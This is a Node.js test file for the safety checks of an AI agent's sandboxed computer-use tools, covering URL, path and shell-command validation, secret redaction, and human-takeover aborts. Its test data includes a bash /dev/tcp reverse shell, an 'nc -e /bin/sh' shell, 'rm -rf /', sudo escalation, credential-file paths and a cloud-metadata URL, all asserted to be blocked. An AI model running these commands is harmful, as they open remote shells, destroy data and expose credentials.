import assert from "node:assert/strict";
import test from "node:test";
import {
  InvalidPathAccessError,
  ProhibitedCommandError,
  UnsafeNavigationError,
  HumanTakeoverActiveError,
  CampaignEndedAbortError,
} from "../lib/computer-types.ts";
import {
  clickMouse,
  downloadSandboxFile,
  dragMouse,
  navigateTo,
  openBrowser,
  readSandboxFile,
  redactSensitiveOutput,
  runShellCommand,
  scrollDisplay,
  takeScreenshot,
  typeInput,
  validateNavigationUrl,
  validateSandboxPath,
  validateShellCommand,
  waitDuration,
  writeSandboxFile,
} from "../lib/computer-tools.ts";

// ---------------------------------------------------------------------------
// Mock Sandbox Implementation (conforming to E2BDesktopSandboxLike)
// ---------------------------------------------------------------------------

function createMockSandbox(overrides = {}) {
  const callLog = [];
  const dummyScreenshot = new Uint8Array([137, 80, 78, 71, 13, 10, 26, 10]); // PNG header bytes
  const mockFiles = new Map([
    ["/home/user/research/notes.txt", "Market research content."],
    ["/home/user/output/chart.png", dummyScreenshot],
    ["/home/user/empty.txt", new Uint8Array([])],
  ]);

  const mock = {
    callLog,
    screenshot: async () => {
      callLog.push({ method: "screenshot" });
      if (overrides.screenshotError) throw new Error(overrides.screenshotError);
      return dummyScreenshot;
    },
    leftClick: async (x, y) => {
      callLog.push({ method: "leftClick", x, y });
      if (overrides.clickError) throw new Error(overrides.clickError);
    },
    rightClick: async (x, y) => {
      callLog.push({ method: "rightClick", x, y });
    },
    doubleClick: async (x, y) => {
      callLog.push({ method: "doubleClick", x, y });
    },
    middleClick: async (x, y) => {
      callLog.push({ method: "middleClick", x, y });
    },
    write: async (text) => {
      callLog.push({ method: "write", text });
      if (overrides.writeError) throw new Error(overrides.writeError);
    },
    press: async (key) => {
      callLog.push({ method: "press", key });
    },
    scroll: async (direction, amount) => {
      callLog.push({ method: "scroll", direction, amount });
      if (overrides.scrollError) throw new Error(overrides.scrollError);
    },
    drag: async (from, to) => {
      callLog.push({ method: "drag", from, to });
      if (overrides.dragError) throw new Error(overrides.dragError);
    },
    wait: async (ms) => {
      callLog.push({ method: "wait", ms });
    },
    open: async (url) => {
      callLog.push({ method: "open", url });
      if (overrides.openError) throw new Error(overrides.openError);
    },
    launch: async (app) => {
      callLog.push({ method: "launch", app });
      if (overrides.launchError) throw new Error(overrides.launchError);
    },
    files: {
      read: async (filePath, opts) => {
        callLog.push({ method: "files.read", filePath, opts });
        if (overrides.readError) throw new Error(overrides.readError);
        const data = mockFiles.get(filePath);
        if (data === undefined) throw new Error(`File not found: ${filePath}`);
        return data;
      },
      write: async (filePath, data) => {
        callLog.push({ method: "files.write", filePath });
        if (overrides.writeError) throw new Error(overrides.writeError);
        mockFiles.set(filePath, data);
        return { path: filePath };
      },
    },
    commands: {
      run: async (cmd, opts) => {
        callLog.push({ method: "commands.run", cmd, opts });
        if (overrides.commandError) throw new Error(overrides.commandError);
        if (cmd === "exit 1") {
          return { stdout: "", stderr: "General error", exitCode: 1 };
        }
        return { stdout: "sample output", stderr: "", exitCode: 0 };
      },
    },
    ...overrides,
  };

  return mock;
}

// Stubbed tool context and no-op verifier for unit tests
const testContext = {
  authUserId: "00000000-0000-0000-0000-000000000001",
  campaignId: 1,
  agentId: "seat-1",
};
const mockDeps = { verifyContext: async () => {} };

// ---------------------------------------------------------------------------
// Tests: Navigation Safety & URL Validation
// ---------------------------------------------------------------------------

test("validateNavigationUrl permits valid public HTTP and HTTPS URLs", () => {
  const u1 = validateNavigationUrl("https://example.com/pricing");
  assert.equal(u1.hostname, "example.com");
  assert.equal(u1.protocol, "https:");

  const u2 = validateNavigationUrl("http://instagram.com/p/12345");
  assert.equal(u2.hostname, "instagram.com");
  assert.equal(u2.protocol, "http:");
});

test("validateNavigationUrl blocks non-HTTP schemes", () => {
  assert.throws(
    () => validateNavigationUrl("file:///etc/passwd"),
    UnsafeNavigationError,
  );
  assert.throws(
    () => validateNavigationUrl("javascript:alert(1)"),
    UnsafeNavigationError,
  );
  assert.throws(
    () => validateNavigationUrl("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="),
    UnsafeNavigationError,
  );
  assert.throws(
    () => validateNavigationUrl("ftp://files.example.com"),
    UnsafeNavigationError,
  );
});

test("validateNavigationUrl blocks localhost and internal domains", () => {
  assert.throws(() => validateNavigationUrl("http://localhost:3000"), UnsafeNavigationError);
  assert.throws(() => validateNavigationUrl("http://sub.localhost:8080"), UnsafeNavigationError);
  assert.throws(() => validateNavigationUrl("http://myhost.local/api"), UnsafeNavigationError);
  assert.throws(() => validateNavigationUrl("http://server.internal/metrics"), UnsafeNavigationError);
  assert.throws(() => validateNavigationUrl("http://intranet.lan"), UnsafeNavigationError);
  assert.throws(() => validateNavigationUrl("http://secure.corp"), UnsafeNavigationError);
});

test("validateNavigationUrl blocks loopback, private, link-local, and cloud metadata IPs", () => {
  assert.throws(() => validateNavigationUrl("http://127.0.0.1"), UnsafeNavigationError);
  assert.throws(() => validateNavigationUrl("http://127.0.0.2:8000"), UnsafeNavigationError);
  assert.throws(() => validateNavigationUrl("http://0.0.0.0"), UnsafeNavigationError);
  assert.throws(() => validateNavigationUrl("http://10.0.1.50"), UnsafeNavigationError);
  assert.throws(() => validateNavigationUrl("http://172.16.0.1"), UnsafeNavigationError);
  assert.throws(() => validateNavigationUrl("http://172.31.255.255"), UnsafeNavigationError);
  assert.throws(() => validateNavigationUrl("http://192.168.1.1"), UnsafeNavigationError);
  assert.throws(
    () => validateNavigationUrl("http://169.254.169.254/latest/meta-data/"),
    UnsafeNavigationError,
  );
  assert.throws(() => validateNavigationUrl("http://[::1]"), UnsafeNavigationError);
  assert.throws(() => validateNavigationUrl("http://[fe80::1]"), UnsafeNavigationError);
  assert.throws(() => validateNavigationUrl("http://[fc00::1]"), UnsafeNavigationError);
  assert.throws(() => validateNavigationUrl("http://2130706433"), UnsafeNavigationError);
  assert.throws(() => validateNavigationUrl("http://0x7f000001"), UnsafeNavigationError);
});

// ---------------------------------------------------------------------------
// Tests: Filesystem Safety & Path Normalization
// ---------------------------------------------------------------------------

test("validateSandboxPath allows approved subdirectories under /home/user", () => {
  assert.equal(
    validateSandboxPath("/home/user/research/competitor.csv"),
    "/home/user/research/competitor.csv",
  );
  assert.equal(
    validateSandboxPath("output/report.pdf"),
    "/home/user/output/report.pdf",
  );
  assert.equal(
    validateSandboxPath("/home/user/assets/logo.png"),
    "/home/user/assets/logo.png",
  );
});

test("validateSandboxPath blocks path traversal and sensitive system directories", () => {
  assert.throws(
    () => validateSandboxPath("/home/user/../../etc/passwd"),
    InvalidPathAccessError,
  );
  assert.throws(
    () => validateSandboxPath("../../../etc/shadow"),
    InvalidPathAccessError,
  );
  assert.throws(() => validateSandboxPath("/etc/passwd"), InvalidPathAccessError);
  assert.throws(() => validateSandboxPath("/proc/cpuinfo"), InvalidPathAccessError);
  assert.throws(() => validateSandboxPath("/sys/class"), InvalidPathAccessError);
  assert.throws(() => validateSandboxPath("/dev/null"), InvalidPathAccessError);
  assert.throws(() => validateSandboxPath("/root/.ssh/id_rsa"), InvalidPathAccessError);
  assert.throws(() => validateSandboxPath("/bin/bash"), InvalidPathAccessError);
  assert.throws(
    () => validateSandboxPath("/home/user/output\0/exploit.txt"),
    InvalidPathAccessError,
  );
});

// ---------------------------------------------------------------------------
// Tests: Shell Command Policy & Sanitization
// ---------------------------------------------------------------------------

test("validateShellCommand permits approved binaries in /home/user", () => {
  const { sanitizedCmd, sanitizedCwd } = validateShellCommand(
    "ls -la /home/user/research",
    "/home/user/research",
  );
  assert.equal(sanitizedCmd, "ls -la /home/user/research");
  assert.equal(sanitizedCwd, "/home/user/research");

  assert.doesNotThrow(() => validateShellCommand("python3 analyze.py"));
  assert.doesNotThrow(() => validateShellCommand("node format.js"));
  assert.doesNotThrow(() => validateShellCommand("cat output.txt | grep revenue"));
});

test("validateShellCommand blocks prohibited commands, root escalation, and reverse shells", () => {
  assert.throws(() => validateShellCommand("sudo apt-get install nmap"), ProhibitedCommandError);
  assert.throws(() => validateShellCommand("su - root"), ProhibitedCommandError);
  assert.throws(() => validateShellCommand("chmod 777 /home/user"), ProhibitedCommandError);
  assert.throws(() => validateShellCommand("rm -rf /"), ProhibitedCommandError);
  assert.throws(() => validateShellCommand("reboot"), ProhibitedCommandError);
  assert.throws(() => validateShellCommand("bash -i >& /dev/tcp/1.2.3.4/8080 0>&1"), ProhibitedCommandError);
  assert.throws(() => validateShellCommand("nc -e /bin/sh 1.2.3.4 4444"), ProhibitedCommandError);
  assert.throws(() => validateShellCommand("gdb /bin/ls"), ProhibitedCommandError);
});

// ---------------------------------------------------------------------------
// Tests: Sensitive Output Redaction
// ---------------------------------------------------------------------------

test("redactSensitiveOutput masks API keys, secrets, and truncates large buffers", () => {
  const sample = "Debug output: E2B_API_KEY=e2b_abcd1234efgh5678ijkl9012 and GEMINI_API_KEY=AIzaSyA12345678901234567890123456789012 and token=secrettoken123";
  const redacted = redactSensitiveOutput(sample);
  assert.match(redacted, /\[REDACTED_E2B_KEY\]/);
  assert.match(redacted, /\[REDACTED_API_KEY\]/);
  assert.match(redacted, /token=\[REDACTED\]/);

  const big = "A".repeat(60_000);
  const truncated = redactSensitiveOutput(big, 100);
  assert.equal(truncated.length, 100 + "\n... [output truncated at 50KB limit]".length);
});

// ---------------------------------------------------------------------------
// Tests: Server-Side Context Verification Enforced Before Execution
// ---------------------------------------------------------------------------

test("primitives reject execution when context verifier throws human takeover", async () => {
  const sandbox = createMockSandbox();
  const takeoverDeps = {
    verifyContext: async () => {
      throw new HumanTakeoverActiveError();
    },
  };

  await assert.rejects(
    () => takeScreenshot(sandbox, testContext, takeoverDeps),
    HumanTakeoverActiveError,
  );
  await assert.rejects(
    () => navigateTo(sandbox, testContext, "https://example.com", takeoverDeps),
    HumanTakeoverActiveError,
  );
  await assert.rejects(
    () => clickMouse(sandbox, testContext, { x: 10, y: 10 }, takeoverDeps),
    HumanTakeoverActiveError,
  );
  assert.equal(sandbox.callLog.length, 0); // zero calls reached sandbox
});

test("primitives reject execution when context verifier throws ended campaign", async () => {
  const sandbox = createMockSandbox();
  const endedDeps = {
    verifyContext: async () => {
      throw new CampaignEndedAbortError();
    },
  };

  await assert.rejects(
    () => openBrowser(sandbox, testContext, "https://example.com", endedDeps),
    CampaignEndedAbortError,
  );
  await assert.rejects(
    () => runShellCommand(sandbox, testContext, "ls", { deps: endedDeps }),
    CampaignEndedAbortError,
  );
  assert.equal(sandbox.callLog.length, 0);
});

// ---------------------------------------------------------------------------
// Tests: All 12 Primitives Execute Successfully With Mock Sandbox
// ---------------------------------------------------------------------------

test("1. takeScreenshot captures bytes and returns base64", async () => {
  const sandbox = createMockSandbox();
  const res = await takeScreenshot(sandbox, testContext, mockDeps);
  assert.equal(res.tool, "screenshot");
  assert.equal(res.verified, true);
  assert.ok(res.screenshotBase64);
  assert.deepEqual(sandbox.callLog, [{ method: "screenshot" }]);
});

test("2. openBrowser launches browser and captures post-action screenshot", async () => {
  const sandbox = createMockSandbox();
  const res = await openBrowser(sandbox, testContext, "https://example.com", mockDeps);
  assert.equal(res.tool, "openBrowser");
  assert.equal(res.verified, true);
  assert.ok(res.screenshotBase64);
  assert.equal(sandbox.callLog[0].method, "open");
  assert.equal(sandbox.callLog[1].method, "wait");
  assert.equal(sandbox.callLog[2].method, "screenshot");
});

test("3. navigateTo opens URL and captures post-action screenshot", async () => {
  const sandbox = createMockSandbox();
  const res = await navigateTo(sandbox, testContext, "https://example.com/pricing", mockDeps);
  assert.equal(res.tool, "navigateTo");
  assert.equal(res.verified, true);
  assert.equal(res.data.targetUrl, "https://example.com/pricing");
  assert.ok(res.screenshotBase64);
});

test("4. clickMouse performs click and captures post-action screenshot", async () => {
  const sandbox = createMockSandbox();
  const res = await clickMouse(sandbox, testContext, { x: 150, y: 250, button: "double" }, mockDeps);
  assert.equal(res.tool, "click");
  assert.equal(res.verified, true);
  assert.ok(res.screenshotBase64);
  assert.deepEqual(sandbox.callLog[0], { method: "doubleClick", x: 150, y: 250 });
});

test("5. typeInput writes text and presses keys", async () => {
  const sandbox = createMockSandbox();
  const res = await typeInput(sandbox, testContext, { text: "search query", key: "enter" }, mockDeps);
  assert.equal(res.tool, "type");
  assert.equal(res.verified, true);
  assert.ok(res.screenshotBase64);
  assert.deepEqual(sandbox.callLog[0], { method: "write", text: "search query" });
  assert.deepEqual(sandbox.callLog[1], { method: "press", key: "enter" });
});

test("6. scrollDisplay executes scroll with safe bounds and screenshot", async () => {
  const sandbox = createMockSandbox();
  const res = await scrollDisplay(sandbox, testContext, "down", 10, mockDeps);
  assert.equal(res.tool, "scroll");
  assert.equal(res.verified, true);
  assert.deepEqual(sandbox.callLog[0], { method: "scroll", direction: "down", amount: 10 });
});

test("7. dragMouse executes drag with valid coordinates", async () => {
  const sandbox = createMockSandbox();
  const res = await dragMouse(sandbox, testContext, [10, 20], [100, 200], mockDeps);
  assert.equal(res.tool, "drag");
  assert.equal(res.verified, true);
  assert.deepEqual(sandbox.callLog[0], { method: "drag", from: [10, 20], to: [100, 200] });
});

test("8. waitDuration bounds wait time and returns verification screenshot", async () => {
  const sandbox = createMockSandbox();
  const res = await waitDuration(sandbox, testContext, 500, mockDeps);
  assert.equal(res.tool, "wait");
  assert.equal(res.verified, true);
  assert.deepEqual(sandbox.callLog[0], { method: "wait", ms: 500 });
});

test("9. runShellCommand executes allowed command and captures output", async () => {
  const sandbox = createMockSandbox();
  const res = await runShellCommand(sandbox, testContext, "ls -la", {
    cwd: "/home/user/research",
    deps: mockDeps,
  });
  assert.equal(res.tool, "runShell");
  assert.equal(res.verified, true);
  assert.equal(res.data.stdout, "sample output");
  assert.equal(res.data.exitCode, 0);
});

test("10. readSandboxFile reads text and bytes from approved path", async () => {
  const sandbox = createMockSandbox();
  const resText = await readSandboxFile(
    sandbox,
    testContext,
    "/home/user/research/notes.txt",
    "text",
    mockDeps,
  );
  assert.equal(resText.verified, true);
  assert.equal(resText.data.content, "Market research content.");

  const resBytes = await readSandboxFile(
    sandbox,
    testContext,
    "/home/user/output/chart.png",
    "bytes",
    mockDeps,
  );
  assert.equal(resBytes.verified, true);
  assert.equal(resBytes.data.sizeBytes, 8);
});

test("11. writeSandboxFile writes data to approved path", async () => {
  const sandbox = createMockSandbox();
  const res = await writeSandboxFile(
    sandbox,
    testContext,
    "/home/user/output/summary.txt",
    "New report content",
    mockDeps,
  );
  assert.equal(res.verified, true);
  assert.equal(res.data.sizeBytes, 18);
});

test("12. downloadSandboxFile verifies non-empty file and returns base64", async () => {
  const sandbox = createMockSandbox();
  const res = await downloadSandboxFile(
    sandbox,
    testContext,
    "/home/user/output/chart.png",
    mockDeps,
  );
  assert.equal(res.verified, true);
  assert.equal(res.data.filename, "chart.png");
  assert.equal(res.data.mimeType, "image/png");
  assert.ok(res.data.bytesBase64);
});

// ---------------------------------------------------------------------------
// Tests: Negative Error Handling & Truthful Unverified Results
// ---------------------------------------------------------------------------

test("downloadSandboxFile reports unverified when file is empty", async () => {
  const sandbox = createMockSandbox();
  const res = await downloadSandboxFile(
    sandbox,
    testContext,
    "/home/user/empty.txt",
    mockDeps,
  );
  assert.equal(res.attempted, true);
  assert.equal(res.verified, false);
  assert.match(res.failureReason, /empty/i);
});

test("primitives report truthful failure when SDK action throws", async () => {
  const sandbox = createMockSandbox({ clickError: "CDP connection lost" });
  const res = await clickMouse(sandbox, testContext, { x: 50, y: 50 }, mockDeps);
  assert.equal(res.attempted, true);
  assert.equal(res.verified, false);
  assert.match(res.error, /CDP connection lost/i);
});
